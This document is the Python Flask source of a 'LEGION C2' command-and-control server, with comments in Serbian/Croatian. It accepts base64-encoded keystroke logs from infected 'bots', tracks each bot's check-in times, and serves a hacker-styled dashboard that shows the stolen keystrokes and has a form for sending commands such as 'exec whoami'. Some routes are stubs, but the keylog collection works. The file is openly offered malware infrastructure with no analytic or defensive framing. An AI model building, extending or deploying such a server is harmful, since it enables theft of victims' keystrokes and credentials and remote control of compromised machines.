#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import base64
import datetime
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # ← OVO JE VAŽNO!

# Memorija za logove
g_keylogs = []
g_bots = {}

# Dashboard template (isti kao prije)
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>🐉 LEGION C2 – DASHBOARD</title>
    <meta charset="UTF-8">
    <style>
        /* ... isti CSS ... */
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { height:100%; overflow:hidden; font-family:'Courier New',monospace; background:#000; }
        #matrix-canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; background:#0a0a2a; }
        .content { position:relative; z-index:1; height:100vh; overflow-y:auto; padding:20px; background:rgba(10,10,30,0.85); color:#00ff41; backdrop-filter:blur(2px); border-left:2px solid #00ff41; border-right:2px solid #00ff41; max-width:98%; margin:0 auto; box-shadow:0 0 30px rgba(0,255,65,0.2); }
        .container { max-width:1400px; margin:0 auto; }
        h1 { color:#00ff41; border-bottom:2px solid #00ff41; padding-bottom:10px; text-shadow:0 0 10px #00ff41; font-size:2.2em; letter-spacing:3px; }
        .stats { display:flex; gap:20px; flex-wrap:wrap; margin:20px 0; }
        .stat-box { background:rgba(0,20,0,0.7); padding:15px 25px; border:1px solid #00ff41; border-radius:8px; box-shadow:0 0 15px rgba(0,255,65,0.3); }
        .stat-box h3 { margin:0; color:#00ff41; font-size:0.9em; text-transform:uppercase; letter-spacing:1px; }
        .stat-box span { font-size:28px; font-weight:bold; }
        table { width:100%; border-collapse:collapse; margin:20px 0; background:rgba(0,10,0,0.6); }
        th, td { border:1px solid #00ff41; padding:8px 12px; text-align:left; }
        th { background:rgba(0,30,0,0.8); color:#00ff41; }
        .command-input { width:70%; padding:10px; background:#0a0a1a; color:#00ff41; border:1px solid #00ff41; border-radius:4px; font-family:monospace; }
        .btn { background:#00ff41; color:#0a0a0a; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; border-radius:4px; transition:all 0.3s; }
        .btn:hover { background:#00cc33; box-shadow:0 0 20px #00ff41; }
        .tab { display:inline-block; padding:10px 20px; background:rgba(0,20,0,0.7); cursor:pointer; border:1px solid #00ff41; border-bottom:none; border-radius:8px 8px 0 0; color:#00ff41; margin-right:5px; }
        .tab.active { background:#00ff41; color:#0a0a0a; }
        .tab-content { display:none; padding:20px; border:1px solid #00ff41; border-top:none; background:rgba(0,10,0,0.5); border-radius:0 0 8px 8px; }
        .tab-content.active { display:block; }
        .log-box { background:rgba(0,10,0,0.7); padding:10px; max-height:400px; overflow-y:auto; font-size:13px; white-space:pre-wrap; border-radius:4px; border:1px solid #00ff41; }
        .refresh { float:right; }
        select, input { background:#0a0a1a; color:#00ff41; border:1px solid #00ff41; padding:5px; }
        ::-webkit-scrollbar { width:8px; }
        ::-webkit-scrollbar-track { background:#0a0a1a; }
        ::-webkit-scrollbar-thumb { background:#00ff41; border-radius:4px; }
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div class="content">
<div class="container">
    <h1>🐉 LEGION C2 – DASHBOARD</h1>
    <div class="stats">
        <div class="stat-box"><h3>🤖 BOTOVI</h3><span id="total_bots">0</span></div>
        <div class="stat-box"><h3>📦 LOG PAKETA</h3><span id="total_logs">0</span></div>
    </div>
    <div style="margin:20px 0;">
        <span class="tab active" onclick="showTab('logs')">📜 Keylog</span>
        <span class="tab" onclick="showTab('commands')">⚡ Komande</span>
    </div>
    <div id="tab-logs" class="tab-content active"><button class="btn" onclick="refreshLogs()">🔄 Osvježi</button><div id="logs_table"><div class="log-box">🔄 Učitavanje...</div></div></div>
    <div id="tab-commands" class="tab-content"><h3>📤 Pošalji komandu</h3><select id="cmd_bot"></select><input type="text" id="cmd_input" class="command-input" placeholder="npr: exec whoami"><button class="btn" onclick="sendCommand()">▶ Pošalji</button><div id="command_result"></div><hr><div id="commands_table"></div></div>
</div>
</div>
<script>
(function matrixRain(){const canvas=document.getElementById('matrix-canvas');const ctx=canvas.getContext('2d');canvas.width=window.innerWidth;canvas.height=window.innerHeight;const cols=Math.floor(canvas.width/20);const drops=[];for(let i=0;i<cols;i++)drops[i]=Math.floor(Math.random()*canvas.height/20);const chars=['0','1'];function draw(){ctx.fillStyle='rgba(10,10,42,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#00ff41';ctx.font='20px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];const x=i*20;const y=drops[i]*20;ctx.fillText(char,x,y);if(y>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}requestAnimationFrame(draw);}draw();window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});})();

function showTab(tab){document.querySelectorAll('.tab-content').forEach(el=>el.classList.remove('active'));document.getElementById('tab-'+tab).classList.add('active');if(tab==='logs')refreshLogs();if(tab==='commands')refreshCommands();}
async function apiCall(endpoint,method='GET',data=null){const options={method,headers:{'Content-Type':'application/json'}};if(data)options.body=JSON.stringify(data);const response=await fetch('/api/'+endpoint,options);return response.json();}
async function refreshLogs(){const data=await apiCall('logs');const table=document.getElementById('logs_table');let html='<div class="log-box">';if(data.logs){data.logs.forEach(log=>{html+=`<span style="color:#ff8800;">[${log.time}]</span> <span style="color:#00ff41;">${log.data}</span>\n`;});}html+='</div>';table.innerHTML=html;document.getElementById('total_logs').textContent=data.logs?data.logs.length:0;}
async function refreshBots(){const data=await apiCall('bots');document.getElementById('total_bots').textContent=data.bots?data.bots.length:0;}
async function sendCommand(){const bot=document.getElementById('cmd_bot').value;const command=document.getElementById('cmd_input').value;if(!bot||!command)return;const data=await apiCall('send_command','POST',{bot_id:bot,command:command});document.getElementById('command_result').innerHTML=data.status==='ok'?'✅ Komanda poslata':'❌ Greška';document.getElementById('cmd_input').value='';refreshCommands();}
async function refreshCommands(){const data=await apiCall('commands');const table=document.getElementById('commands_table');let html='<table><tr><th>Bot</th><th>Komanda</th><th>Status</th></tr>';if(data.commands){data.commands.forEach(cmd=>{html+=`<tr><td>${cmd.bot_id}</td><td>${cmd.command}</td><td>${cmd.status}</td></tr>`;});}html+='</table>';table.innerHTML=html;}
setInterval(()=>{refreshLogs();refreshBots();},5000);
refreshLogs();refreshBots();refreshCommands();
</script>
</body>
</html>
"""

# =====================================================================
# RUTE
# =====================================================================
@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/keylog', methods=['POST'])
def receive_keylog():
    print("[+] Request received on /keylog")  # ← LOGOVANJE
    
    try:
        data = request.get_json()
        if not data:
            print("[-] No JSON data")
            return jsonify({"status": "error", "message": "No data"}), 400
        
        bot_id = data.get('id')
        log_data = data.get('data')
        
        if not bot_id or not log_data:
            print("[-] Missing bot_id or log_data")
            return jsonify({"status": "error", "message": "Missing fields"}), 400
        
        # Dekodiraj base64
        try:
            decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
        except:
            decoded_log = log_data
        
        now = datetime.datetime.now().isoformat()
        g_keylogs.append({"bot": bot_id, "data": decoded_log, "time": now})
        
        if bot_id not in g_bots:
            g_bots[bot_id] = {"first_seen": now, "last_seen": now}
        else:
            g_bots[bot_id]["last_seen"] = now
        
        print(f"[+] Keylog received from {bot_id} ({len(decoded_log)} chars)")
        
        return jsonify({"status": "ok", "message": "Data received"}), 200
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/command', methods=['GET'])
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return jsonify({"status": "error"}), 400
    # ... (isti kao prije)
    return jsonify({"status": "ok", "command": None})

@app.route('/result', methods=['POST'])
def command_result():
    # ... (isti kao prije)
    return jsonify({"status": "ok"})

@app.route('/api/logs', methods=['GET'])
def api_logs():
    return jsonify({"logs": g_keylogs[-100:]})

@app.route('/api/bots', methods=['GET'])
def api_bots():
    bots = []
    for bot_id, info in g_bots.items():
        bots.append({
            "bot_id": bot_id,
            "first_seen": info.get("first_seen"),
            "last_seen": info.get("last_seen")
        })
    return jsonify({"bots": bots})

@app.route('/api/commands', methods=['GET'])
def api_commands():
    return jsonify({"commands": []})

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    return jsonify({"status": "ok"})

# =====================================================================
# START
# =====================================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
